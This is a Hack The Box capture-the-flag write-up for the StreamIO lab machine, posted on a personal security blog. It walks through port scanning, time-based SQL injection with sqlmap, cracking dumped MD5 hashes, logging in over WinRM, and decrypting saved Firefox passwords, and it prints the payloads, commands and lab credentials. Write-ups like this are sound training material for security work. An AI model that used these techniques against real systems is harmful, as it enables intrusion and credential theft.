
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="index, follow" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
        disabled="disabled"
    href="/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
            disabled="disabled"
          href="/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
          href="/theme/pygments/github.min.css">


  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/solid.css">

  <link rel="stylesheet" type="text/css" href="/static/css/custom.css">

    <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Security Blog Atom">



  


 

<meta name="author" content="raphajohnsec" />
<meta name="description" content="Click on &#34;Continue Reading&#34; to activate the password field." />
<meta name="keywords" content="#htb, #python, #impacket, #windows, #active-directory, #writeup">


  <meta property="og:site_name" content="Security Blog"/>
  <meta property="og:title" content="HTB - StreamIO - Writeup"/>
  <meta property="og:description" content="Click on &#34;Continue Reading&#34; to activate the password field."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="/drafts/htb-streamio-writeup.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2022-06-14 00:00:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="/author/raphajohnsec.html">
  <meta property="article:section" content="htb"/>
  <meta property="article:tag" content="#htb"/>
  <meta property="article:tag" content="#python"/>
  <meta property="article:tag" content="#impacket"/>
  <meta property="article:tag" content="#windows"/>
  <meta property="article:tag" content="#active-directory"/>
  <meta property="article:tag" content="#writeup"/>
  <meta property="og:image" content="/images/profile.jpg">

  <title>Security Blog &ndash; HTB - StreamIO - Writeup</title>

</head>
<body class="light-theme">
  <aside>
    <div>
      <a href="/">
        <img src="/images/profile.jpg" alt="Security Blog" title="Security Blog">
      </a>

      <h1>
        <a href="/">Security Blog</a>
      </h1>

<p>Content is my own</p>

      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="/pages/about/">
                  About
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-twitter" href="https://twitter.com/raphajohnsec" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="/">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-streamio-writeup">HTB - StreamIO - Writeup</h1>
    <p>
      Posted on Tue 14 June 2022 in <a href="/category/htb.html">htb</a>

    </p>
  </header>


  <div>
    <h1>Reconnaissance</h1>
<p>We have an IP, so we start with the usual, a simple port scan using nmap.</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Nmap 7.80 scan initiated Wed Jun 15 08:35:18 2022 as: nmap -p - -T4 -sV -oA nmap_streamio 10.10.11.158</span>
Nmap scan report <span class="k">for</span> streamio <span class="o">(</span><span class="m">10</span>.10.11.158<span class="o">)</span>
Host is up <span class="o">(</span><span class="m">0</span>.026s latency<span class="o">)</span>.
Not shown: <span class="m">65517</span> filtered ports
PORT      STATE SERVICE       VERSION
<span class="m">53</span>/tcp    open  domain?
<span class="m">80</span>/tcp    open  http          Microsoft IIS httpd <span class="m">10</span>.0
<span class="m">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: <span class="m">2022</span>-06-15 <span class="m">13</span>:14:25Z<span class="o">)</span>
<span class="m">135</span>/tcp   open  msrpc         Microsoft Windows RPC
<span class="m">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
<span class="m">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: streamIO.htb0., Site: Default-First-Site-Name<span class="o">)</span>
<span class="m">443</span>/tcp   open  ssl/http      Microsoft HTTPAPI httpd <span class="m">2</span>.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="m">445</span>/tcp   open  microsoft-ds?
<span class="m">464</span>/tcp   open  kpasswd5?
<span class="m">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="m">1</span>.0
<span class="m">636</span>/tcp   open  tcpwrapped
<span class="m">5985</span>/tcp  open  http          Microsoft HTTPAPI httpd <span class="m">2</span>.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="m">9389</span>/tcp  open  mc-nmf        .NET Message Framing
<span class="m">49667</span>/tcp open  msrpc         Microsoft Windows RPC
<span class="m">49673</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="m">1</span>.0
<span class="m">49674</span>/tcp open  msrpc         Microsoft Windows RPC
<span class="m">49701</span>/tcp open  msrpc         Microsoft Windows RPC
<span class="m">61653</span>/tcp open  msrpc         Microsoft Windows RPC
<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V<span class="o">=</span><span class="m">7</span>.80%I<span class="o">=</span><span class="m">7</span>%D<span class="o">=</span><span class="m">6</span>/15%Time<span class="o">=</span>62A97E0B%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
SF:ersionBindReqTCP,20,<span class="s2">&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\</span>
<span class="s2">SF:x04bind\0\0\x10\0\x03&quot;</span><span class="o">)</span><span class="p">;</span>
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span class="c1"># Nmap done at Wed Jun 15 08:39:11 2022 -- 1 IP address (1 host up) scanned in 233.05 seconds</span>
</code></pre></div>

<p>No RDP, but ldap port open and responding with domain information, the host might be an active directory domain controller. Let's see what the http/https ports show.</p>
<div class="highlight"><pre><span></span><code>curl --silent -v http://$TIP
</code></pre></div>

<div class="highlight"><pre><span></span><code>*   Trying 10.10.11.158:80...
* TCP_NODELAY set
* Connected to 10.10.11.158 (10.10.11.158) port 80 (#0)
&gt; GET / HTTP/1.1
&gt; Host: 10.10.11.158
&gt; User-Agent: curl/7.68.0
&gt; Accept: */*
&gt; 
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html
&lt; Last-Modified: Tue, 22 Feb 2022 10:46:01 GMT
&lt; Accept-Ranges: bytes
&lt; ETag: &quot;b23de861d927d81:0&quot;
&lt; Server: Microsoft-IIS/10.0
&lt; X-Powered-By: ASP.NET
&lt; Date: Wed, 15 Jun 2022 13:24:29 GMT
&lt; Content-Length: 703
&lt; 
{ [703 bytes data]
* Connection #0 to host 10.10.11.158 left intact
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot; /&gt;
&lt;title&gt;IIS Windows Server&lt;/title&gt;
&lt;style type=&quot;text/css&quot;&gt;
&lt;!--
body {
    color:#000000;
    background-color:#0072C6;
    margin:0;
}

#container {
    margin-left:auto;
    margin-right:auto;
    text-align:center;
    }

a img {
    border:none;
}

--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;container&quot;&gt;
&lt;a href=&quot;http://go.microsoft.com/fwlink/?linkid=66138&amp;amp;clcid=0x409&quot;&gt;&lt;img src=&quot;iisstart.png&quot; alt=&quot;IIS&quot; width=&quot;960&quot; height=&quot;600&quot; /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div>

<p>Standard IIS site..., https responds with a 404...
Maybe <a href="https://github.com/projectdiscovery/nuclei#install-nuclei">nuclei</a> can find more information.
<img alt="Nuclei http" src="/images/htb/streamio/htb_streamio_nuclei_http.PNG">
Not for http.. Nothing intersting, but https leads to more information
<img alt="Nuclei https" src="/images/htb/streamio/htb_streamio_nuclei_https.PNG">
You can see, nuclei found two DNS names inside the SSL certificate:
- <strong>streamIO.htb</strong>
- <strong>watch.streamIO.htb</strong></p>
<p>Maybe the webserver responds differently whem we talk to the domain instead of the IP.
We specify the hostnames in <code>/etc/hosts</code>. If we ran our own DNS resolver, we could also specify the addresses there.
Include this</p>
<div class="highlight"><pre><span></span><code>10.10.11.158    streamio streamIO.htb0 watch.streamIO.htb streamio.htb
</code></pre></div>

<p>The http response is still the same when requesting <code>http://streamio.htb</code>, but <code>https://streamio.htb</code> now responds with a "real" website.
<img alt="streamio https site" src="/images/htb/streamio/htb_streamio_https_site.PNG">
Also <code>https://watch.streamio.htb</code> reveals a website.
<img alt="streamio https site" src="/images/htb/streamio/htb_streamio_watch_https_site.PNG"></p>
<p>Nuclei couln't find any vulnerabilities for both websites. Time to crawl both sites.
feroxbuster found some available endpoints on <code>https://streamio.htb</code></p>
<div class="highlight"><pre><span></span><code>./feroxbuster -k -u https://streamio.htb/ -x php,html,txt -w directory-list-lowercase-2.3-small.txt -t <span class="m">100</span> -o feroxbuster_streamio.htb.log

<span class="m">200</span>      GET      395l      915w    13497c https://streamio.htb/
<span class="m">301</span>      GET        2l       10w      151c https://streamio.htb/images <span class="o">=</span>&gt; https://streamio.htb/images/
<span class="hll"><span class="m">200</span>      GET      121l      291w     4500c https://streamio.htb/register.php
</span><span class="hll"><span class="m">200</span>      GET      206l      430w     6434c https://streamio.htb/contact.php
</span><span class="hll"><span class="m">200</span>      GET      395l      915w    13497c https://streamio.htb/index.php
</span><span class="hll"><span class="m">200</span>      GET      231l      571w     7825c https://streamio.htb/about.php
</span><span class="hll"><span class="m">200</span>      GET      111l      269w     4145c https://streamio.htb/login.php
</span><span class="hll"><span class="m">301</span>      GET        2l       10w      150c https://streamio.htb/admin <span class="o">=</span>&gt; https://streamio.htb/admin/
</span><span class="m">301</span>      GET        2l       10w      157c https://streamio.htb/admin/images <span class="o">=</span>&gt; https://streamio.htb/admin/images/
<span class="m">403</span>      GET        1l        1w       18c https://streamio.htb/admin/index.php
<span class="m">301</span>      GET        2l       10w      148c https://streamio.htb/css <span class="o">=</span>&gt; https://streamio.htb/css/
<span class="m">301</span>      GET        2l       10w      154c https://streamio.htb/admin/css <span class="o">=</span>&gt; https://streamio.htb/admin/css/
<span class="m">301</span>      GET        2l       10w      147c https://streamio.htb/js <span class="o">=</span>&gt; https://streamio.htb/js/
<span class="m">301</span>      GET        2l       10w      153c https://streamio.htb/admin/js <span class="o">=</span>&gt; https://streamio.htb/admin/js/
<span class="m">302</span>      GET        0l        0w        0c https://streamio.htb/logout.php <span class="o">=</span>&gt; https://streamio.htb/
<span class="m">301</span>      GET        2l       10w      150c https://streamio.htb/fonts <span class="o">=</span>&gt; https://streamio.htb/fonts/
<span class="hll"><span class="m">200</span>      GET        2l        6w       58c https://streamio.htb/admin/master.php
</span><span class="m">301</span>      GET        2l       10w      156c https://streamio.htb/admin/fonts <span class="o">=</span>&gt; https://streamio.htb/admin/fonts/
</code></pre></div>

<p>While trying to analyse <code>https://watch.streamio.htb</code>, feroxbuster and nuclei threw an error or didn't output any results. I thought at first, that the entry in <code>/etc/hosts</code> was wrong, but the entries were correct. I could't fingure why streamio.htb resolved correctly but watch.streamio.htb didn't. To resolve this I had to set up my own DNS resolver as suggested earlier in this article.
Because I use Ubuntu 20.04 as my pwnbox, I can install dnscrypt-proxy from the repository, it's up to date enough.</p>
<div class="highlight"><pre><span></span><code>apt install dnscrypt-proxy
</code></pre></div>

<p>You don't even have to disable existing name server/resolver on the system. dnscrypt-proxy listens by default and the address 127.0.2.1.
I edit the default config slightly, I add the following content just after <code>server_names = ['cloudflare']</code> in <code>/etc/dnscrypt-proxy/dnscrypt-proxy.toml</code>.</p>
<div class="highlight"><pre><span></span><code>cloaking_rules = &#39;cloaking_rules.txt&#39;
</code></pre></div>

<p>We add the file <code>/etc/dnscrypt-proxy/cloaking_rules.txt</code> with the content</p>
<div class="highlight"><pre><span></span><code>*.streamio.htb  10.10.11.158
</code></pre></div>

<p>and to <code>/etc/resolv.conf</code> we add <code>nameserver    127.0.2.1</code> as first nameserver entry. Now we remove the entries from <code>/etc/hosts</code> regarding streamio.htb. 
Restart the service</p>
<div class="highlight"><pre><span></span><code>
</code></pre></div>

<p>Now every DNS request to *.streamio.htb resolves to thhe specified IP.
nuclei now returns some info for <code>watch.streamio.htb</code>, but nothing intersting. But feroxbuster could find some endpoints</p>
<div class="highlight"><pre><span></span><code>200      GET       78l      245w     2829c https://watch.streamio.htb/
200      GET     7193l    19558w   253887c https://watch.streamio.htb/search.php
200      GET       78l      245w     2829c https://watch.streamio.htb/index.php
200      GET       20l       47w      677c https://watch.streamio.htb/blocked.php
301      GET        2l       10w      157c https://watch.streamio.htb/static =&gt; https://watch.streamio.htb/static/
</code></pre></div>

<p>Soooo let's look on all those endpoints...
Starting with the register.php endpoint. We can type in a username and a password. The site will always respond with "Account created" nevertheless, we registered the username before.</p>
<p><img alt="register.php" src="/images/htb/streamio/streamio.htb_register.php.PNG">
<img alt="account created" src="/images/htb/streamio/streamio.htb_register_account_created.php.PNG"></p>
<p>But when we try to login with our newly created user, the login fails. Later on, we will learn, that only one user can login successfully.</p>
<p><img alt="register.php" src="/images/htb/streamio/streamio.htb_login_failed.php.PNG"></p>
<p><code>contact.php</code> had a form available but did't lead to anything.
<code>/admin/index.php</code> showed <strong>FORBIDDEN</strong>, but
<code>admin/master.php</code> showed this</p>
<p><img alt="register.php" src="/images/htb/streamio/streamio.htb_admin_master.php.PNG"></p>
<h1>SQL Injection</h1>
<p><code>watch.streamio.htb/search.php</code> didn't liked SQL injection tries and redirected to <code>blocked.php</code></p>
<p><img alt="register.php" src="/images/htb/streamio/watch.streamio.htb_search_blocked.php.PNG"></p>
<p>Let's see what <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> can do for us. Trying all those found endpoints, I will show the results for <code>login.php</code></p>
<div class="highlight"><pre><span></span><code>sqlmap.py -u https://streamIO.htb/login.php --method POST --data <span class="nv">username</span><span class="o">=</span>FUZZ<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>FUZZ --batch --time-sec <span class="m">1</span>
</code></pre></div>

<p>sqlmap was lucky, sort of lucky because the injection is time based... ZZZZZzzzzzZZZZZzzzzz</p>
<div class="highlight"><pre><span></span><code>sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=FUZZ&#39;;WAITFOR DELAY &#39;0:0:1&#39;--&amp;password=FUZZ
---
web server operating system: Windows 10 or 2016 or 2019
web application technology: Microsoft IIS 10.0, PHP, PHP 7.2.26
back-end DBMS: Microsoft SQL Server 2019
</code></pre></div>

<p>Using sqlmap again, we retrieve the available datbases</p>
<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --batch --time-sec <span class="m">1</span> --dbs
available databases <span class="o">[</span><span class="m">5</span><span class="o">]</span>:
<span class="o">[</span>*<span class="o">]</span> model
<span class="o">[</span>*<span class="o">]</span> msdb
<span class="o">[</span>*<span class="o">]</span> STREAMIO
<span class="o">[</span>*<span class="o">]</span> streamio_backup
<span class="o">[</span>*<span class="o">]</span> tempdb
</code></pre></div>

<p>We couldn't extract any tables from <code>streamio_backup</code>, maybe due to missing permissions, but for <code>STREAMIO</code> it worked.</p>
<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --batch --time-sec <span class="m">1</span> -D STREAMIO --tables
Database: STREAMIO
<span class="o">[</span><span class="m">2</span> tables<span class="o">]</span>
+--------+
<span class="p">|</span> movies <span class="p">|</span>
<span class="p">|</span> users  <span class="p">|</span>
+--------+
</code></pre></div>

<p>Great a <code>users</code> table. Extracting now the columns...</p>
<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --batch --time-sec <span class="m">1</span> -D STREAMIO -T users --columns
Database: STREAMIO
Table: users
<span class="o">[</span><span class="m">4</span> columns<span class="o">]</span>
+----------+-------+
<span class="p">|</span> Column   <span class="p">|</span> Type  <span class="p">|</span>
+----------+-------+
<span class="p">|</span> id       <span class="p">|</span> int   <span class="p">|</span>
<span class="p">|</span> is_staff <span class="p">|</span> bit   <span class="p">|</span>
<span class="p">|</span> password <span class="p">|</span> nchar <span class="p">|</span>
<span class="p">|</span> username <span class="p">|</span> nchar <span class="p">|</span>
+----------+-------+
</code></pre></div>

<p>There are around 30 users in that table, depending on how many registered at that time.
I selected those usernames where <strong>is_staff</strong> is set to <strong>0</strong>.</p>
<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --time-sec <span class="m">1</span> --sql-query<span class="o">=</span><span class="s2">&quot;SELECT username FROM STREAMIO..users WHERE is_staff=0&quot;</span>
</code></pre></div>

<p>It only returned one username... <strong>admin</strong> and I retrieved the password, probably MD5 <strong>665a50ac9eaa781e4f7f04199db97a11</strong>. Crackstation revealed the password <strong>paddpadd</strong>. The login with those credentials still fails.
So we dump all usernames, limiting the dumped characters to 10 chars. This took around 30 minutes.</p>
<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> -D STREAMIO -T users -C username --dump --batch --time-sec <span class="m">1</span> --last <span class="m">10</span>
Database: STREAMIO
Table: users
<span class="o">[</span><span class="m">30</span> entries<span class="o">]</span>
+-----------+
<span class="p">|</span> username  <span class="p">|</span>
+-----------+
<span class="p">|</span> James     <span class="p">|</span>
<span class="p">|</span> Theodore  <span class="p">|</span>
<span class="p">|</span> Samantha  <span class="p">|</span>
<span class="p">|</span> Lauren    <span class="p">|</span>
<span class="p">|</span> William   <span class="p">|</span>
<span class="p">|</span> Sabrina   <span class="p">|</span>
<span class="p">|</span> Robert    <span class="p">|</span>
<span class="p">|</span> Thane     <span class="p">|</span>
<span class="p">|</span> Carmon    <span class="p">|</span>
<span class="p">|</span> Barry     <span class="p">|</span>
<span class="p">|</span> Oliver    <span class="p">|</span>
<span class="p">|</span> Michelle  <span class="p">|</span>
<span class="p">|</span> Gloria    <span class="p">|</span>
<span class="p">|</span> Victoria  <span class="p">|</span>
<span class="p">|</span> Alexendra <span class="p">|</span>
<span class="p">|</span> Baxter    <span class="p">|</span>
<span class="p">|</span> Clara     <span class="p">|</span>
<span class="p">|</span> Barbra    <span class="p">|</span>
<span class="p">|</span> Lenord    <span class="p">|</span>
<span class="p">|</span> Austin    <span class="p">|</span>
<span class="p">|</span> Garfield  <span class="p">|</span>
<span class="p">|</span> Juliette  <span class="p">|</span>
<span class="p">|</span> Victor    <span class="p">|</span>
<span class="p">|</span> Lucifer   <span class="p">|</span>
<span class="p">|</span> Bruno     <span class="p">|</span>
<span class="p">|</span> Diablo    <span class="p">|</span>
<span class="p">|</span> Robin     <span class="p">|</span>
<span class="p">|</span> Stan      <span class="p">|</span>
<span class="p">|</span> yoshihide <span class="p">|</span>
<span class="p">|</span> admin     <span class="p">|</span>
+-----------+
</code></pre></div>

<p>Now i could dump all passwords, respectivly the MD5 hashes, but I try another way first.</p>
<p>There are 2 usernames that stand out.
1. yoshihide
2. admin</p>
<p>I try to register <strong>admin</strong> with my own password and log in. No success.
I try to register <strong>yoshihide</strong> with my own password and log in. <strong>SUCCESS</strong>
Finally the log in with my own registered password worked and I can navigate to the <code>/admin/</code>site.</p>
<p><img alt="admin interface" src="images/htb/streamio/streamio.htb_admin.PNG"></p>
<p>So the endpoints seem to allow deletion of users and movies. I suspect some sort of "DELETE" SQL query behind those request and sqlmap could find again an injection, but again time based...</p>
<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/admin/?movie&quot;</span> --method<span class="o">=</span>POST --data <span class="s2">&quot;movie_id=1666&quot;</span> --cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=jedeq7831tbnm0b12lneefghmd&quot;</span> --dbms<span class="o">=</span><span class="s2">&quot;Microsoft SQL Server&quot;</span>
sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
---
Parameter: movie_id <span class="o">(</span>POST<span class="o">)</span>
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries <span class="o">(</span>comment<span class="o">)</span>
    Payload: <span class="nv">movie_id</span><span class="o">=</span><span class="m">1666</span><span class="p">;</span>WAITFOR DELAY <span class="s1">&#39;0:0:5&#39;</span>--

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind <span class="o">(</span>IF<span class="o">)</span>
    Payload: <span class="nv">movie_id</span><span class="o">=</span><span class="m">1666</span> WAITFOR DELAY <span class="s1">&#39;0:0:5&#39;</span>
---
</code></pre></div>

<p>This time the <strong>db_admin</strong> user is used to conduct those queries instead if the <strong>db_user</strong> before. Maybe we can access <strong>streamio_backup</strong> now.
And yesssss, the tables enumeration worked.. more or less.. sqlmap had a hard time to retrieve those tables. Maybe the machine was under load at that time.</p>
<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/admin/?movie&quot;</span> --method<span class="o">=</span>POST --data <span class="s2">&quot;movie_id=1666&quot;</span> --cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=jedeq7831tbnm0b12lneefghmd&quot;</span>  --dbms<span class="o">=</span><span class="s2">&quot;Microsoft SQL Server&quot;</span> --output-dir<span class="o">=</span>~/venv3/htb/streamio/sqlmap/ -D streamio_backup --tables --fresh-queries
Database: streamio_backup
<span class="o">[</span><span class="m">2</span> tables<span class="o">]</span>
+--------+
<span class="p">|</span> movies <span class="p">|</span>
<span class="p">|</span> users  <span class="p">|</span>
+--------+
</code></pre></div>

<p>The table <strong>users</strong> has 3 columns <code>id, password, username</code>. The retrieving was very slow, retrieving 2 rows took 45 minutes.</p>
<div class="highlight"><pre><span></span><code>nikk37 - 389d14cb8e4e9b94b137deb1caf0612a
yoshihide - b779ba15cedfd22a023c4d8bcf5f2332
</code></pre></div>

<p>Again MD5 hashes...</p>
<div class="highlight"><pre><span></span><code>389d14cb8e4e9b94b137deb1caf0612a    md5 get_dem_girls2@yahoo.com
b779ba15cedfd22a023c4d8bcf5f2332    md5 66boysandgirls..
</code></pre></div>

<h1>Pivoting</h1>
<p>Great both cracked, let's see if SMB login works.</p>
<div class="highlight"><pre><span></span><code><span class="c1"># nikk37 worked</span>
cme smb streamio.htb -u nikk37 -p <span class="s1">&#39;get_dem_girls2@yahoo.com&#39;</span>
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span>.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\n</span>ikk37:get_dem_girls2@yahoo.com

<span class="c1"># and whats even better? winrm worked too</span>

evil-winrm  -i <span class="nv">$TIP</span> -u nikk37 -p <span class="s1">&#39;get_dem_girls2@yahoo.com&#39;</span>

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\n</span>ikk37<span class="se">\D</span>ocuments&gt;

<span class="c1"># and there is the user flag</span>
*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\n</span>ikk37<span class="se">\D</span>esktop&gt; ls


    Directory: C:<span class="se">\U</span>sers<span class="se">\n</span>ikk37<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        <span class="m">6</span>/17/2022   <span class="m">5</span>:17 AM             <span class="m">34</span> user.txt
</code></pre></div>

<p>Now I go for the root flag. </p>
<div class="highlight"><pre><span></span><code><span class="n">net</span> <span class="n">user</span>

<span class="n">User</span> <span class="n">accounts</span> <span class="k">for</span> <span class="p">\\</span>

<span class="p">-------------------------------------------------------------------------------</span>
<span class="n">Administrator</span>            <span class="n">Guest</span>                    <span class="n">JDgodd</span>
<span class="n">krbtgt</span>                   <span class="n">Martin</span>                   <span class="n">nikk37</span>
<span class="n">yoshihide</span>
</code></pre></div>

<p><code>net user</code> tells us about the other user accounts. I tried already the decrypted password for yoshihide, but it didn't work. Now going for <strong>Martin</strong> and <strong>JDgodd</strong>.
It's always a good idea to search the filesystem.
We have access to the web server scripts in <code>C:\inetpub\</code> where we could find the db credentials</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-ChildItem</span> <span class="n">-recurse</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-pattern</span> <span class="s2">&quot;db_&quot;</span> <span class="p">|</span> <span class="nb">group </span><span class="n">path</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span>

<span class="n">Name</span>
<span class="p">----</span>
<span class="n">C</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">streamio</span><span class="p">.</span><span class="n">htb</span><span class="p">\</span><span class="n">admin</span><span class="p">\</span><span class="n">index</span><span class="p">.</span><span class="n">php</span>
<span class="c"># and</span>
<span class="nb">type </span><span class="s2">&quot;C:/inetpub/streamio.htb/admin/index.php&quot;</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="n">db_</span>

<span class="nv">$connection</span> <span class="p">=</span> <span class="n">array</span><span class="p">(</span><span class="s2">&quot;Database&quot;</span><span class="p">=&gt;</span><span class="s2">&quot;STREAMIO&quot;</span><span class="p">,</span> <span class="s2">&quot;UID&quot;</span> <span class="p">=&gt;</span> <span class="s2">&quot;db_admin&quot;</span><span class="p">,</span> <span class="s2">&quot;PWD&quot;</span> <span class="p">=&gt;</span> <span class="s1">&#39;B1@hx31234567890&#39;</span><span class="p">);</span>
</code></pre></div>

<p>But there is nothing we can do with those credentials, we already know what's inside the database. </p>
<p>Sooo keep on digging on the box itself using the winrm shell. After a while I found some Firefox data inside <code>C:\Users\nikk37\Appdata\Roaming\Mozilla\Firefox</code>
The very great Evil-WinRM can download the whole folder for us.</p>
<div class="highlight"><pre><span></span><code><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">nikk37</span><span class="p">\</span><span class="n">Appdata</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Mozilla</span><span class="p">&gt;</span> <span class="n">download</span> <span class="s2">&quot;C:/Users/nikk37/Appdata/Roaming/Mozilla/Firefox/&quot;</span>
<span class="n">Info</span><span class="p">:</span> <span class="n">Downloading</span> <span class="n">C</span><span class="p">:/</span><span class="n">Users</span><span class="p">/</span><span class="n">nikk37</span><span class="p">/</span><span class="n">Appdata</span><span class="p">/</span><span class="n">Roaming</span><span class="p">/</span><span class="n">Mozilla</span><span class="p">/</span><span class="n">Firefox</span><span class="p">/</span> <span class="n">to</span> <span class="p">./</span><span class="n">Firefox</span>


<span class="n">Info</span><span class="p">:</span> <span class="n">Download</span> <span class="n">successful</span><span class="p">!</span>
</code></pre></div>

<p>After a short while we have a copy of the Firefox folder on our local system. Now we can use some other tools, to look if passwords are saved in Firefox.
<a href="https://github.com/Unode/firefox_decrypt">firefox_decrypt</a> worked very well, but sadly only with Python 3.9+. Ubuntu 20.04 ships with Python 3.8.
Nevertheless</p>
<div class="highlight"><pre><span></span><code>python firefox_decrypt.py Firefox/
Select the Mozilla profile you wish to decrypt
<span class="m">1</span> -&gt; Profiles/5rwivk2l.default
<span class="m">2</span> -&gt; Profiles/br53rxeg.default-release
<span class="m">2</span>

Website:   https://slack.streamio.htb
Username: <span class="s1">&#39;admin&#39;</span>
Password: <span class="s1">&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span>

Website:   https://slack.streamio.htb
Username: <span class="s1">&#39;nikk37&#39;</span>
Password: <span class="s1">&#39;n1kk1sd0p3t00:)&#39;</span>

Website:   https://slack.streamio.htb
Username: <span class="s1">&#39;yoshihide&#39;</span>
Password: <span class="s1">&#39;paddpadd@12&#39;</span>

Website:   https://slack.streamio.htb
